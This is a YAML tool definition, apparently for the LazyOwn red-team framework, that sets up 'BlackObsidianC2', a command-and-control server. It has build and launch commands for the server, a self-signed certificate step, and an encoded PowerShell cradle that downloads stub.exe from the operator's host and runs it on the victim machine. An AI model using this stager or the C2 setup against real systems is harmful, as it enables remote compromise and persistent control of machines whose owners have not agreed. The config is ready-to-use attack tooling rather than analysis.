name: BlackObsidianC2
description: 'Black Obsidian is a next-generation C2 (Command & Control) server designed for professional Red Team operations. Built with Go and PocketBase, it offers a modern and specialized alternative to complex C2 servers while maintaining agility, security, and customization ease.
  USAGE: 
  ./c2-server serve --https=0.0.0.0:4444
  '
author: LazyOwn RedTeam
version: '1.0'
enabled: true
params:
- name: lhost
  type: string
  required: true
  description: lhost target.
- name: lport
  type: string
  required: true
  description: lport target.  
os: any
trigger: []
tool:
  name: BlackObsidianC2
  repo_url: https://github.com/grisuno/BlackObsidianC2.git
  install_path: external/.exploit/BlackObsidianC2
  install_command: go get github.com/pocketbase/pocketbase ; go build -o c2-server
  execute_command: openssl genpkey -algorithm RSA -out key.pem -pkeyopt rsa_keygen_bits:2048 ; openssl req -new -x509 -key key.pem -out cert.pem -days 365 -subj "/C=CL/ST=Hack/L=World/O=C2/CN=127.0.0.1" ; openssl pkcs8 -topk8 -nocrypt -in key.pem -out key_go.pem ;  export TLS_CERT=./cert.pem ; export TLS_KEY=./key_go.pem ; export C2_AES_KEY={aes_key} ;  ./c2-server serve --https=0.0.0.0:{lport}
  lazycommand: encodewinbase64 powershell -c 'Invoke-WebRequest "http://{lhost}/stub.exe"
    -OutFile "stub.exe"; Start-Process "stub.exe"'
  env:
    LAZYOWN_AES_KEY: "{aes_key}"
category: 10. Command & Control
